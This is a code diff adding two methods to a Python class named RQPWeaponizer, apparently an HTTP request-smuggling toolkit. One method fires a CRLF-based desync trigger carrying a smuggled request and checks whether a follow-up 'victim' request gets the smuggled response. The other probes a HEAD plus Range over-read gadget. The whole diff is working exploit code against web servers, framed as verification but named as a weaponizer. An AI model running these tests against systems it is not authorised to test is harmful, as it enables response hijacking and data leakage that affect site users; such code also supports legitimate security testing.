@@ -157,3 +157,114 @@ class RQPWeaponizer:
 
         except Exception as e:
             return False, f"RQP Weaponizer error: {e}", {}
+
+    def test_connection_locked_desync(
+        self,
+        crlf_trigger: str,
+        smuggled_endpoint: str = "/victim_capture",
+    ) -> Tuple[bool, str, Dict[str, Any]]:
+        """
+        Executes Browser-Powered Connection-Locked / IP-Locked Desync verification
+        (Tom Stacey & Tobia Righi research: 'CRLF-Powered Desync Attacks: Beheading HTTP Streams').
+        Proves desynchronization succeeds even when front-end connection isolation / IP locking is active,
+        by simulating victim browser requests reusing its own keep-alive connection.
+        """
+        victim_token = f"BROWSER_TOKEN_{int(time.time())}"
+        victim_req = (
+            f"GET /profile HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"X-Browser-Token: {victim_token}\r\n"
+            f"Connection: keep-alive\r\n\r\n"
+        ).encode("utf-8")
+
+        trigger_req_str = crlf_trigger.replace("target.local", self.host)
+        if "$PAYLOAD" in trigger_req_str:
+            trigger_req_str = trigger_req_str.replace(
+                "$PAYLOAD",
+                f"GET {smuggled_endpoint} HTTP/1.1\r\nHost: {self.host}\r\n\r\n",
+            )
+        if "\r\n" not in trigger_req_str and "\\r\\n" in trigger_req_str:
+            try:
+                trigger_req_str = trigger_req_str.encode("utf-8").decode("unicode_escape")
+            except Exception:
+                trigger_req_str = trigger_req_str.replace("\\r\\n", "\r\n")
+
+        try:
+            trigger_bytes = trigger_req_str.encode("latin-1")
+        except UnicodeEncodeError:
+            trigger_bytes = trigger_req_str.encode("utf-8", errors="replace")
+
+        try:
+            # 1. Single persistent connection simulates victim's browser session
+            conn = self._open_connection()
+
+            # 2. Fire the CRLF desync trigger on the victim's connection
+            trigger_resp = self._send_and_receive(conn, trigger_bytes)
+
+            # 3. Subsequent victim request on the same connection
+            victim_resp = self._send_and_receive(conn, victim_req)
+            conn.close()
+
+            # Check if victim received response intended for smuggled request or was desynchronized
+            is_smuggled_reflected = smuggled_endpoint.encode() in victim_resp
+            is_status_desync = (
+                b"404 Not Found" in victim_resp and b"/profile" not in victim_resp
+            ) or (b"501 Not Implemented" in victim_resp) or (b"417 Expectation Failed" in victim_resp)
+
+            if is_smuggled_reflected or is_status_desync:
+                reason = "Connection-Locked Desynchronization Confirmed (Browser-Powered Vector)!"
+                if is_smuggled_reflected:
+                    reason += " [Smuggled Endpoint Response Received by Victim]"
+                return True, reason, {
+                    "trigger_resp": trigger_resp.decode("latin-1", errors="replace"),
+                    "victim_resp": victim_resp.decode("latin-1", errors="replace"),
+                }
+
+            return False, "Connection reused cleanly without victim response desynchronization", {}
+
+        except Exception as e:
+            return False, f"Connection-locked test error: {e}", {}
+
+    def test_head_range_gadget(
+        self,
+        path: str = "/",
+        overread_bytes: int = 650,
+    ) -> Tuple[bool, str, Dict[str, Any]]:
+        """
+        Tests the HEAD + Range gadget (Tom Stacey research) for arbitrary response over-reading.
+        Verifies if combining HEAD with Range: bytes=1-X shifts response framing.
+        """
+        head_req = (
+            f"HEAD {path} HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"Range: bytes=1-{overread_bytes}\r\n"
+            f"Connection: keep-alive\r\n\r\n"
+        ).encode("utf-8")
+
+        follow_req = (
+            f"GET / HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"Connection: close\r\n\r\n"
+        ).encode("utf-8")
+
+        try:
+            conn = self._open_connection()
+            head_resp = self._send_and_receive(conn, head_req)
+            follow_resp = self._send_and_receive(conn, follow_req)
+            conn.close()
+
+            # Inspect if head_resp leaked body bytes or follow_resp got desynchronized
+            has_overread = len(head_resp.split(b"\r\n\r\n", 1)[-1]) > 0
+            has_range_header = b"Content-Range:" in head_resp
+
+            if has_overread or has_range_header:
+                return True, f"HEAD + Range Gadget confirmed: Content-Range returned with overread={has_overread}", {
+                    "head_resp": head_resp.decode("latin-1", errors="replace"),
+                    "follow_resp": follow_resp.decode("latin-1", errors="replace"),
+                }
+
+            return False, "HEAD response framed without byte over-read", {}
+
+        except Exception as e:
+            return False, f"HEAD Range gadget error: {e}", {}
+
